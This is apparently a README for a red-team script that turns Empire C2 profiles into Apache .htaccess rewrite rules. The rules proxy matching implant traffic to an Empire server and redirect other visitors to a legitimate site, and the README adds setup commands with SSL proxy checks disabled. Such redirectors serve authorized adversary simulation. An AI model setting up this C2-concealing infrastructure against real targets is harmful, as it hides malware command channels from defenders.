# Convert Empire profiles to Apache mod_rewrite .htaccess files to support HTTP C2 Redirection

This is a quick script that converts a empire profile to a functional mod_rewrite .htaccess file to support HTTP proxy redirection from Apache to a empire server.

You should test and tune the output as needed before depolying

__Updates and Features__

 - Rewrite Rules based on valid C2 URIs (HTTP GET, POST, and Stager) and specified User-Agent string. Result: Only requests to valid C2 URIs with a specified UA string will be proxied to the Team Server by default.
 - Uses a custom Malleable C2 profile to build a .htaccess file with corresponding mod_rewrite rules
 - HTTP or HTTPS proxying to the Empire Server
 - HTTP 302 Redirection to a Legitimate Site for Non-Matching Requests	

## Example
```
$ python e2modrewrite.py -i profile/comfoo.txt -c 192.168.1.1 -d https://google.com 

#### Save the following as .htaccess in the root web directory
########################################
## .htaccess START

RewriteEngine On

## (Optional)
## Empire Stager
## Uncomment and adjust as needed
#RewriteCond %{REQUEST_URI} ^/css/style1.css?$
#RewriteCond %{HTTP_USER_AGENT} ^$
#RewriteRule ^.*$ "http://192.168.1.1/download/po" [P,L]

## Profile URIs
RewriteCond %{REQUEST_URI} ^/(include/template/isx.php|wp06/wp-includes/po.php|wp08/wp-includes/dtcla.php|modules/mod_search.php|blog/wp-includes/pomo/src.php|includes/phpmailer/class.pop3.php)/?$

## Profile UserAgent
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5\.0\ \(Windows;\ U;\ MSIE\ 7\.0;\ Windows\ NT\ 5\.2\)\ Java/1\.5\.0_08?$
RewriteRule ^.*$ http://192.168.1.1%{REQUEST_URI} [P]

# Redirect all other traffic here
RewriteRule ^.*$ https://google.com/? [L,R=302]

## .htacess END
########################################
```

----------------------------------------------
## Apache Rewrite Setup and Tips

__Enable Rewrite and Proxy__

    a2enmod rewrite
    a2enmod proxy
    a2enmod proxy_http
    service apache2 reload

__SSL support requires the following in the site config__

    # Enable SSL
    SSLEngine On
    # Enable Proxy
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

## References

[Apache mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)
